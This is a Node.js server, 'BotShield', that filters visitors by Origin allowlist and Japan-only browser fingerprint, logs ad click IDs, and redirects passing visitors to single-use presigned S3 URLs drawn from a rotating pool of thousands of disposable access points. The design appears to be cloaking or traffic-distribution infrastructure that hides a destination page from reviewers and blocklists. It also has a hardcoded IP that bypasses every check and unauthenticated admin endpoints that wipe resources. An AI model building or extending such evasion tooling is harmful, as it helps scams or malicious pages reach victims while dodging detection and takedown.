require("dotenv").config();
const http = require("http");
const url = require("url");
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const { S3Client, GetObjectCommand, HeadObjectCommand } = require("@aws-sdk/client-s3");
const {
  S3ControlClient,
  CreateAccessPointCommand,
  DeleteAccessPointCommand,
  ListAccessPointsCommand,
} = require("@aws-sdk/client-s3-control");
const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");

// ─── Config ───────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const REGION = process.env.AWS_REGION || "ap-northeast-1";
const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
const BUCKET_NAME = process.env.BUCKET_NAME;
const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";

const BATCH_SIZE = 3000;
const TOPUP_THRESHOLD = 300;
const PRESIGN_EXPIRY_SECONDS = 30;
const TOPUP_LOCK_TTL_SECONDS = 120;
const LOCK_REFRESH_INTERVAL_MS = 30_000;
const TOPUP_CONCURRENCY = 10;
const POP_MAX_TRIES = 5;
const READINESS_MAX_MS = 60_000;

// ─── Redis keys ───────────────────────────────────────────────────
const KEY_UNUSED = "aps:unused"; // LIST — FIFO queue of AP names
const KEY_USED = "aps:used"; // SET — names already served (observability)
const KEY_BATCHES = "aps:batches"; // LIST — batch ids, head = oldest
const KEY_TOPUP_LOCK = "aps:topup_lock"; // STRING with TTL
const keyBatchMembers = (id) => `aps:batch:${id}:members`; // SET
const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`; // STRING (int)

// ─── Origins ──────────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
  "https://kotonohaschooljpnew.d2iebmp9qpa7oy.amplifyapp.com",
  "https://miyabikinjp.d70mrxb8oodr0.amplifyapp.com",
  "https://horizontravelss.com",
  "https://fitnessmojov4.d14w9pgizygrjq.amplifyapp.com",
  "https://ayakotravel.agency",
];
const TEST_BYPASS_IP = "45.151.152.118";

// ─── Clients ──────────────────────────────────────────────────────
const s3Client = new S3Client({ region: REGION });
const s3Control = new S3ControlClient({ region: REGION });
const redis = new Redis(process.env.REDIS_URL);
redis.on("error", (err) => console.error("Redis error:", err.message));

// ─── AP pool helpers ──────────────────────────────────────────────

async function listAllAccessPoints() {
  const names = [];
  let NextToken;
  do {
    const resp = await s3Control.send(
      new ListAccessPointsCommand({
        AccountId: ACCOUNT_ID,
        Bucket: BUCKET_NAME,
        MaxResults: 1000,
        NextToken,
      }),
    );
    for (const ap of resp.AccessPointList || []) names.push(ap.Name);
    NextToken = resp.NextToken;
  } while (NextToken);
  return names;
}

async function deleteManyAccessPoints(names) {
  let failed = 0;
  for (const name of names) {
    try {
      await s3Control.send(
        new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }),
      );
    } catch (err) {
      if (err.name === "NoSuchAccessPoint") continue;
      failed++;
      console.error(`[AP] delete failed for ${name}: ${err.name || err.message}`);
    }
  }
  return names.length - failed;
}

// Ownership-checked Lua scripts so a stale-but-expired lock holder can never
// extend or release someone else's lock.
const SCRIPT_REFRESH_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("expire", KEYS[1], ARGV[2])
else
  return 0
end
`;

const SCRIPT_RELEASE_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("del", KEYS[1])
else
  return 0
end
`;

async function withTopupLock(label, fn) {
  const token = `${label}-${uuidv4()}`;
  const got = await redis.set(
    KEY_TOPUP_LOCK,
    token,
    "EX",
    TOPUP_LOCK_TTL_SECONDS,
    "NX",
  );
  if (!got) return { acquired: false };

  const refresher = setInterval(() => {
    redis
      .eval(SCRIPT_REFRESH_LOCK, 1, KEY_TOPUP_LOCK, token, TOPUP_LOCK_TTL_SECONDS)
      .catch(() => {});
  }, LOCK_REFRESH_INTERVAL_MS);

  try {
    const result = await fn();
    return { acquired: true, result };
  } finally {
    clearInterval(refresher);
    await redis
      .eval(SCRIPT_RELEASE_LOCK, 1, KEY_TOPUP_LOCK, token)
      .catch(() => {});
  }
}

// Probe an AP via HeadObject until S3 returns 200 (or a definitive 404 — which
// proves the AP itself works, the object just isn't there). Used at the end of
// top-up to make sure the freshest APs have propagated before we expose them.
async function waitForApReady(name, maxMs = READINESS_MAX_MS) {
  const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;
  const start = Date.now();
  let delay = 500;
  while (Date.now() - start < maxMs) {
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
      return true;
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      if (status === 404 || err.name === "NotFound") return true;
      await new Promise((r) => setTimeout(r, delay));
      delay = Math.min(delay * 2, 4000);
    }
  }
  return false;
}

// Retire any batches at the head of the queue whose remaining counter is 0.
// Deletes their AWS APs in the background.
async function retireExhaustedBatches() {
  while (true) {
    const oldestId = await redis.lindex(KEY_BATCHES, 0);
    if (!oldestId) return;
    const remaining = Number(
      (await redis.get(keyBatchRemaining(oldestId))) || 0,
    );
    if (remaining > 0) return;

    const members = await redis.smembers(keyBatchMembers(oldestId));
    const tx = redis.multi();
    tx.lpop(KEY_BATCHES);
    tx.del(keyBatchMembers(oldestId));
    tx.del(keyBatchRemaining(oldestId));
    if (members.length > 0) tx.srem(KEY_USED, ...members);
    await tx.exec();

    console.log(
      `[retire] batch ${oldestId}: queuing ${members.length} APs for AWS delete`,
    );
    if (members.length > 0) {
      deleteManyAccessPoints(members).catch((e) =>
        console.error("[retire] delete:", e),
      );
    }
  }
}

let topupRunning = false;

async function runTopUp() {
  if (topupRunning) return;
  topupRunning = true;
  try {
    const lockResult = await withTopupLock("topup", async () => {
      const unused = await redis.llen(KEY_UNUSED);
      if (unused > TOPUP_THRESHOLD) {
        console.log(
          `[topUp] unused=${unused} above threshold=${TOPUP_THRESHOLD}; skipping`,
        );
        return { skipped: true };
      }

      const batchId = Date.now().toString();
      console.log(
        `[topUp] creating batch ${batchId}: ${BATCH_SIZE} APs (concurrency=${TOPUP_CONCURRENCY})…`,
      );

      const start = Date.now();
      const created = [];
      const failures = [];
      let nextI = 1;
      let progress = 0;

      async function worker() {
        while (true) {
          const i = nextI++;
          if (i > BATCH_SIZE) return;
          const name = `ap-${batchId}-${uuidv4().split("-")[0]}-${i}`;
          try {
            await s3Control.send(
              new CreateAccessPointCommand({
                AccountId: ACCOUNT_ID,
                Name: name,
                Bucket: BUCKET_NAME,
              }),
            );
            created.push(name);
          } catch (err) {
            failures.push({ name, err: err.name || err.message });
            console.error(`[topUp] create failed (${name}): ${err.name || err.message}`);
          }
          progress++;
          if (progress % 200 === 0) {
            console.log(`[topUp] progress: ${progress}/${BATCH_SIZE}`);
          }
        }
      }

      await Promise.all(
        Array.from({ length: TOPUP_CONCURRENCY }, () => worker()),
      );

      if (created.length === 0) {
        console.error("[topUp] all creates failed");
        return { skipped: false, created: 0, failed: failures.length };
      }

      // Wait for the most-recently-created AP to propagate. Earlier APs were
      // created earlier and have had even longer to become serviceable.
      const probeName = created[created.length - 1];
      const probeStart = Date.now();
      const ready = await waitForApReady(probeName, READINESS_MAX_MS);
      const probeSecs = ((Date.now() - probeStart) / 1000).toFixed(1);
      if (ready) {
        console.log(`[topUp] readiness probe ok in ${probeSecs}s`);
      } else {
        console.warn(
          `[topUp] readiness probe timed out after ${probeSecs}s; pushing anyway (pop-time probe will catch stragglers)`,
        );
      }

      const tx = redis.multi();
      tx.sadd(keyBatchMembers(batchId), ...created);
      tx.set(keyBatchRemaining(batchId), created.length);
      tx.rpush(KEY_UNUSED, ...created);
      tx.rpush(KEY_BATCHES, batchId);
      const results = await tx.exec();

      if (!results) {
        console.error(
          `[topUp] Redis MULTI aborted; rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }
      const partialErrors = results
        .filter(([err]) => err)
        .map(([err]) => err.message);
      if (partialErrors.length) {
        console.error(
          `[topUp] Redis MULTI partial failure (${partialErrors.join("; ")}); rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }

      const secs = ((Date.now() - start) / 1000).toFixed(1);
      console.log(
        `[topUp] batch ${batchId}: ${created.length}/${BATCH_SIZE} live, ${failures.length} failed, ${secs}s`,
      );
      return {
        skipped: false,
        created: created.length,
        failed: failures.length,
      };
    });

    if (!lockResult.acquired) {
      console.log("[topUp] another worker holds the lock; skipping");
    }
  } catch (err) {
    console.error("[topUp] error:", err);
  } finally {
    topupRunning = false;
  }
}

function maybeTriggerTopUp() {
  redis
    .llen(KEY_UNUSED)
    .then((n) => {
      if (n <= TOPUP_THRESHOLD && !topupRunning) {
        runTopUp().catch((e) => console.error("[topUp] bg:", e));
      }
    })
    .catch(() => {});
}

async function decrementOwningBatch(name) {
  const ids = await redis.lrange(KEY_BATCHES, 0, -1);
  for (const id of ids) {
    const isMember = await redis.sismember(keyBatchMembers(id), name);
    if (isMember) {
      const remaining = await redis.decr(keyBatchRemaining(id));
      if (remaining <= 0) {
        retireExhaustedBatches().catch((e) =>
          console.error("[retire]:", e),
        );
      }
      return;
    }
  }
}

// Drop a name we believe is dead from the pool's bookkeeping. Same accounting
// as a normal pop (decrements the owning batch counter so retirement still
// progresses), but skips the KEY_USED add and best-effort deletes the AP from
// AWS in case it actually exists in a broken state.
async function dropDeadAp(name, reason) {
  console.warn(`[pool] dropping AP ${name}: ${reason}`);
  await decrementOwningBatch(name);
  s3Control
    .send(new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }))
    .catch(() => {});
}

async function nextPresignedUrl() {
  for (let attempt = 0; attempt < POP_MAX_TRIES; attempt++) {
    const name = await redis.lpop(KEY_UNUSED);
    if (!name) {
      // Pool dry — kick off an emergency topup and bail.
      runTopUp().catch((e) => console.error("[topUp] emergency:", e));
      return null;
    }

    const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;

    // Validate the AP is alive before issuing a URL. Self-heals stale Redis
    // entries (deleted from AWS, broken policy, never propagated, etc.).
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      // 404 means the AP works but the object is missing — that's a config
      // issue, not a dead AP. Fall through and serve the URL anyway.
      if (status !== 404 && err.name !== "NotFound") {
        await dropDeadAp(name, `${err.name || "ProbeFailed"} (${status || "?"})`);
        maybeTriggerTopUp();
        continue;
      }
    }

    const presigned = await getSignedUrl(
      s3Client,
      new GetObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      { expiresIn: PRESIGN_EXPIRY_SECONDS },
    );

    await redis.sadd(KEY_USED, name);
    await decrementOwningBatch(name);
    maybeTriggerTopUp();
    return presigned;
  }
  console.warn(
    `[pool] gave up after ${POP_MAX_TRIES} stale APs in a row; pool may be poisoned`,
  );
  return null;
}

async function boot() {
  // Hold the top-up lock for the orphan sweep so a concurrent runTopUp can't
  // be creating APs in AWS while we classify "untracked AWS APs" as orphans
  // and delete them. Without this, the boot sweep can race a top-up's MULTI
  // and end up deleting APs that get RPUSHed into Redis seconds later.
  const lockResult = await withTopupLock("boot", async () => {
    try {
      const awsNames = await listAllAccessPoints();
      const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
      const tracked = new Set();
      for (const id of batchIds) {
        const mems = await redis.smembers(keyBatchMembers(id));
        mems.forEach((n) => tracked.add(n));
      }
      const orphans = awsNames.filter((n) => !tracked.has(n));
      if (orphans.length) {
        console.log(`[boot] cleaning ${orphans.length} orphan APs from AWS`);
        await deleteManyAccessPoints(orphans);
      } else {
        console.log("[boot] no orphan APs");
      }
    } catch (err) {
      console.error("[boot] cleanup failed:", err.message);
    }
  });

  if (!lockResult.acquired) {
    console.log(
      "[boot] top-up lock held; skipping orphan sweep (pop-time probe will self-heal stale entries)",
    );
  }

  // runTopUp acquires the lock itself, so this must happen after boot's lock
  // is released.
  const unused = await redis.llen(KEY_UNUSED);
  if (unused <= TOPUP_THRESHOLD) {
    console.log(`[boot] unused=${unused}; bootstrapping pool…`);
    await runTopUp();
  } else {
    console.log(`[boot] pool ready: ${unused} unused APs`);
  }
}

// ─── Origin + fingerprint verification (carried over) ─────────────

function checkOrigin(req) {
  const origin = (req.headers["origin"] || "").replace(/\/+$/, "");
  const referer = req.headers["referer"] || "";

  let effectiveOrigin = origin;
  if (!effectiveOrigin && referer) {
    try {
      effectiveOrigin = new URL(referer).origin;
    } catch (_) {}
  }

  if (!effectiveOrigin) {
    return {
      allowed: false,
      origin: null,
      reason:
        "No Origin or Referer header present — likely a direct/scripted request",
    };
  }

  const normalised = effectiveOrigin.replace(/\/+$/, "").toLowerCase();
  const isAllowed = ALLOWED_ORIGINS.some(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === normalised,
  );

  return {
    allowed: isAllowed,
    origin: effectiveOrigin,
    reason: isAllowed
      ? "Origin allowed"
      : `Origin "${effectiveOrigin}" is not in the allow-list`,
  };
}

function buildRedirectJS(redirectURL) {
  if (!redirectURL) return "";
  return `window.location.replace(${JSON.stringify(redirectURL)});`;
}

function verify(fp, ip) {
  const results = [];
  const critical = [];

  (function checkJapan() {
    const tz = (fp.timezone || "").toLowerCase();
    const lang = (fp.language || "").toLowerCase();
    const langs = (fp.languages || []).map((l) => l.toLowerCase());

    // IANA identifiers that map to JST (UTC+9 / Japan).
    const JAPAN_TIMEZONES = new Set([
      "asia/tokyo",
      "japan",
      "etc/gmt-9",
      "etc/gmt-09",
      "jst",
      "jst-9",
    ]);

    const isJapanTz = JAPAN_TIMEZONES.has(tz);
    const isJapanOffset = fp.timezoneOffset === -540;
    const hasJaLang =
      lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));

    const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
    const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));

    const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);

    critical.push({
      name: "japan_locale",
      pass,
      reason: pass
        ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
        : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
    });
  })();

  const criticalFail = critical.find((c) => !c.pass);
  if (criticalFail) {
    return {
      verified: false,
      reason: `Critical check failed: ${criticalFail.name} — ${criticalFail.reason}`,
      checks: [...critical, ...results],
    };
  }

  const totalWeight = results.reduce((s, r) => s + r.weight, 0);
  const earnedWeight = results
    .filter((r) => r.pass)
    .reduce((s, r) => s + r.weight, 0);
  const score = totalWeight > 0 ? (earnedWeight / totalWeight) * 100 : 100;

  const THRESHOLD = 60;
  return {
    verified: score >= THRESHOLD,
    score: Math.round(score),
    reason:
      score >= THRESHOLD
        ? "Passed"
        : `Score ${Math.round(score)}% below threshold ${THRESHOLD}%`,
    checks: [...critical, ...results],
  };
}

// ─── HTTP server ──────────────────────────────────────────────────

const server = http.createServer(async (req, res) => {
  const reqOrigin = (req.headers["origin"] || "")
    .replace(/\/+$/, "")
    .toLowerCase();
  const matchedOrigin = ALLOWED_ORIGINS.find(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === reqOrigin,
  );

  let _earlyIP =
    req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (_earlyIP.includes(",")) _earlyIP = _earlyIP.split(",")[0].trim();
  _earlyIP = _earlyIP.replace(/^::ffff:/, "");
  const _isTestBypass = _earlyIP === TEST_BYPASS_IP;

  if (matchedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
  } else if (_isTestBypass && req.headers["origin"]) {
    res.setHeader("Access-Control-Allow-Origin", req.headers["origin"]);
  }
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Vary", "Origin");

  if (req.method === "OPTIONS") {
    res.writeHead(matchedOrigin || _isTestBypass ? 204 : 403);
    return res.end();
  }

  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/verify" && req.method === "POST") {
    let earlyIP =
      req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (earlyIP.includes(",")) earlyIP = earlyIP.split(",")[0].trim();
    earlyIP = earlyIP.replace(/^::ffff:/, "");
    const isTestBypass = earlyIP === TEST_BYPASS_IP;

    const originCheck = checkOrigin(req);
    if (!originCheck.allowed && !isTestBypass) {
      console.log(`\n🚫 ORIGIN REJECTED: ${originCheck.reason}`);
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          verified: false,
          reason: `Origin not allowed: ${originCheck.reason}`,
        }),
      );
    }

    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { fingerprint, gclid, source, ts: clientTs } = JSON.parse(body);
        let clientIP =
          req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
        if (clientIP.includes(",")) clientIP = clientIP.split(",")[0].trim();
        clientIP = clientIP.replace(/^::ffff:/, "");

        console.log("\n══════════════════════════════════════════════");
        console.log(
          `[${new Date().toISOString()}] Verification request from ${clientIP}`,
        );
        console.log(`  Source: ${source}  |  Client TS: ${clientTs}`);
        console.log(`  GCLID: ${gclid ? gclid.slice(0, 20) + "…" : "(none)"}`);

        if (clientIP === TEST_BYPASS_IP) {
          console.log(
            `  🔓 TEST BYPASS — IP ${clientIP} matches, skipping checks`,
          );
          const presigned = await nextPresignedUrl();
          console.log(
            `  🔗 Presigned URL: ${presigned ? "issued" : "POOL EMPTY"}`,
          );
          console.log("══════════════════════════════════════════════\n");
          const status = presigned ? 200 : 503;
          res.writeHead(status, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: !!presigned,
              reason: presigned ? "Test bypass" : "Pool empty — try again",
              code: buildRedirectJS(presigned),
            }),
          );
        }

        const result = verify(fingerprint, clientIP);

        console.log(
          `  FP result: ${result.verified ? "✅ VERIFIED" : "❌ REJECTED"} (score: ${result.score ?? "N/A"})`,
        );
        if (!result.verified) console.log(`  Reason: ${result.reason}`);
        for (const c of result.checks) {
          console.log(`    ${c.pass ? "✓" : "✗"} ${c.name}: ${c.reason}`);
        }
        console.log("══════════════════════════════════════════════\n");

        const response = { verified: result.verified, reason: result.reason };
        let httpStatus = result.verified ? 200 : 403;

        if (result.verified) {
          const presigned = await nextPresignedUrl();
          if (presigned) {
            response.code = buildRedirectJS(presigned);
          } else {
            response.verified = false;
            response.reason = "Pool empty — emergency top-up triggered";
            httpStatus = 503;
            console.log("  ⚠️  Pool empty; emergency topup kicked off");
          }
        }

        res.writeHead(httpStatus, { "Content-Type": "application/json" });
        res.end(JSON.stringify(response));
      } catch (err) {
        console.error("[BotShield] Parse error:", err.message);
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ verified: false, reason: "Bad request" }));
      }
    });
    return;
  }

  if (parsed.pathname === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "ok", uptime: process.uptime() }));
  }

  if (parsed.pathname === "/status") {
    try {
      const [unused, used, batchIds, lockVal, lockTtl] = await Promise.all([
        redis.llen(KEY_UNUSED),
        redis.scard(KEY_USED),
        redis.lrange(KEY_BATCHES, 0, -1),
        redis.get(KEY_TOPUP_LOCK),
        redis.ttl(KEY_TOPUP_LOCK),
      ]);
      const batches = [];
      for (const id of batchIds) {
        const [size, remaining] = await Promise.all([
          redis.scard(keyBatchMembers(id)),
          redis.get(keyBatchRemaining(id)),
        ]);
        batches.push({ id, size, remaining: Number(remaining || 0) });
      }
      res.writeHead(200, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify(
          {
            unused,
            used,
            batches,
            topupRunning,
            topupLock: lockVal ? { value: lockVal, ttlSeconds: lockTtl } : null,
            config: { BATCH_SIZE, TOPUP_THRESHOLD, PRESIGN_EXPIRY_SECONDS },
          },
          null,
          2,
        ),
      );
    } catch (err) {
      res.writeHead(500, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  // Manual top-up trigger. ?force=1 clears any stale lock + in-memory flag first.
  if (parsed.pathname === "/admin/topup" && req.method === "POST") {
    const force = parsed.query.force === "1";
    if (force) {
      await redis.del(KEY_TOPUP_LOCK).catch(() => {});
      topupRunning = false;
    }
    runTopUp().catch((e) => console.error("[topUp] manual:", e));
    res.writeHead(202, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ triggered: true, forced: force }));
  }

  // Full reset: wipe all pool-related Redis keys + delete every AP in the
  // bucket. Holds the top-up lock so a concurrent top-up can't keep writing
  // names into Redis (or APs into AWS) while we're nuking. ?force=1 clears
  // any stale lock first.
  if (parsed.pathname === "/admin/reset" && req.method === "POST") {
    try {
      if (parsed.query.force === "1") {
        await redis.del(KEY_TOPUP_LOCK).catch(() => {});
        topupRunning = false;
      }

      const lockResult = await withTopupLock("reset", async () => {
        const awsNames = await listAllAccessPoints();
        console.log(`[reset] deleting ${awsNames.length} APs from AWS…`);
        if (awsNames.length) await deleteManyAccessPoints(awsNames);

        const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
        const tx = redis.multi();
        tx.del(KEY_UNUSED);
        tx.del(KEY_USED);
        tx.del(KEY_BATCHES);
        for (const id of batchIds) {
          tx.del(keyBatchMembers(id));
          tx.del(keyBatchRemaining(id));
        }
        await tx.exec();
        return { awsDeleted: awsNames.length, batchesCleared: batchIds.length };
      });

      if (!lockResult.acquired) {
        res.writeHead(409, { "Content-Type": "application/json" });
        return res.end(
          JSON.stringify({
            error: "Top-up in progress; retry shortly or POST with ?force=1",
          }),
        );
      }

      topupRunning = false;
      res.writeHead(200, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          reset: true,
          ...lockResult.result,
          note: "Now POST /admin/topup to rebuild the pool.",
        }),
      );
    } catch (err) {
      console.error("[reset] error:", err);
      res.writeHead(500, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(PORT, () => {
  console.log(`\n🛡️  BotShield verification server on port ${PORT}`);
  console.log(`   POST /verify  — fingerprint verification + presigned URL`);
  console.log(`   GET  /health  — health check`);
  console.log(`   GET  /status  — pool state`);
  console.log(`   POST /admin/topup[?force=1]  — trigger a top-up`);
  console.log(`   POST /admin/reset  — wipe AWS + Redis, then re-topup`);
  console.log(`\n   Allowed origins:`);
  for (const o of ALLOWED_ORIGINS) console.log(`     • ${o}`);
  console.log("");
  boot().catch((e) => console.error("[boot] fatal:", e));
});
